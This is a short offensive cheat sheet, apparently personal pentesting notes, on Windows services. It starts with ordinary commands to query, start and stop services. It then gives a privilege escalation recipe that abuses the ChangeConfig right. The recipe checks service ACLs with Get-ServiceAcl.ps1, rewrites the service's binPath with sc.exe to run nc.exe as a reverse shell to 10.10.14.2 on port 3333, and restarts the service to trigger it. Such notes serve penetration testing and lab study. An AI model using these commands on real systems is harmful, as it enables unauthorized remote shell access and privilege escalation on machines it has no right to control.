This page is a work in progress... Need to consolidate more stuff over here
#### Basics
```PowerShell
Get-Service -name "<Service>"   # Enumerate state of Service
Start-Service <service>
Stop-Service <service>

# CMD
sc.exe qc <service>       # Query information of one service
sc.exe query state= all   # Query state of ALL services (commonly disabled)
sc.exe start <service>    # start
sc.exe stop <service>     # stop
```

#### ChangeConfig Service Right Abuse
This first involves running Get-ServiceAcl.ps1. This will show information such as can we Start and Stop the Service, and Rights we have.

If ChangeConfig is present, we can update the Binary_Path_Name to any path we want

Abusing ChangeConfig Service Right
```PowerShell
Import-Module .\Get-ServiceAcl.ps1
"<SERVICE>" | Get-ServiceAcl | select -ExpandProperty Access
# Look for our current user

# Modiify Binary path if ChangeConfig is present
sc.exe config <SERVICE> binPath="cmd.exe /c C:/Users/dharding/Documents/nc.exe -e cmd.exe 10.10.14.2 3333"

sc.exe stop <SERVICE>     # Consiter restarting if AUTO is enabled...
sc.exe start <SERVICE>
```
